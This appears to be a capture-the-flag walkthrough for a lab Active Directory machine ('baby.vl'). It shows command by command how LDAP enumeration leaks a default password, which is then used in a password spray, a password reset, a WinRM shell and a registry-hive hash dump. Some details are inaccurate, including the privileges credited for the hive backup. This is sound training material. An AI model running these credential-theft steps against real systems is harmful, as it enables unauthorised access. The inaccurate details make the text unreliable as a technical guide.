`nmap -v -sC -sV -oA nmap/baby 10.129.234.71`
```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-03 03:26:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-02T00:44:18
| Not valid after:  2026-08-04T00:44:18
| MD5:     11d2 c39d 076a a67b 7c85 5389 4790 4ce4
| SHA-1:   55e1 0181 f6b5 931d 4e28 29dc 8028 db9b a7c5 9ba6
|_SHA-256: 6540 b627 e535 3634 c431 f117 e221 3f3a 3d1a 5eef 4875 c284 cfdc 9d70 06e3 fcd0
|_ssl-date: 2026-02-03T03:27:01+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-03T03:26:21+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

```
Domain name: BabyDC.baby.vl

Using the `LDAP` It is possible to harvest creds.
![[Pasted image 20260202224149.png]]
`ldapsearch -x -H ldap://10.129.234.71 -b "dc=baby,dc=vl" '(objectClass=Person)' sAMAccountName | grep sAMAccountName`

Using the `ldapsearch we can also look for any other informtion`
Under one of the users there is a possible default password of `BabyStart123!`

![[Pasted image 20260202225135.png]]
Putting that into a password file can be used for a possible spray attack later

Another thing to look at is the `Distinguished Names`
Using `ldapsearch -x -H ldap://10.129.234.71 -b "dc=baby,dc=vl" '*' | grep dn`
This came up with a few more names
```bash
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```
Adding both the names of `Ian` and `Caroline`we can extend our userlist in that format.

Running a `netexec` password spray, the user Caroline needs there password reset.
`nxc ldap 10.129.234.71 -u userlist.txt -p 'BabyStart123!' -d baby.vl --users`
![[Pasted image 20260202231629.png]]
Using the `smbpasswd` command, one can change the users password. This will allow us to make a new one for the user
```bash
┌──(lazarus㉿Xerek)-[~]
└─$ smbpasswd -U Baby/caroline.robinson -r baby.vl                      
Old SMB password: 'BabyStart123!'
New SMB password: 'NewPass123'
Retype new SMB password: 'NewPass123'
Password changed for user caroline.robinson

```
After that we should be able to RDP into the machine.
```bash
┌──(lazarus㉿Xerek)-[~]
└─$ evil-winrm -i 10.129.234.71 -u caroline.robinson -p NewPass123  
Evil-WinRM shell v3.9

C:\Users\Caroline.Robinson\Documents> 

```
From here you can travel to the Desktop and snag the user flag
![[Pasted image 20260202232906.png]]
Lets see what the user has as permissions. 
Doing a `whoami /prvi`
![[Pasted image 20260202233047.png]]
Two things to pull from this...
1. SeChangeNotifyPrivilege
2. SeIncreaseWorkingSetPrivilege

With this we back create backups of the `sam` registry files and get some NTLM hashes.
The commands are listed below.
`reg save hklm\sam .\sam`
`reg save hklm\system .\system`
`download sam`
`download system`
![[Pasted image 20260203211452.png]]

After that we can run an `impacket-secretsdump` to get the `sam` hashes.
![[Pasted image 20260203211620.png]]

Unfortunately, this administrator hash does not work. But we can try and dump the domain hashes by creating a volume shadow copy using NDTS.dit.


![[Pasted image 20260203221415.png]]
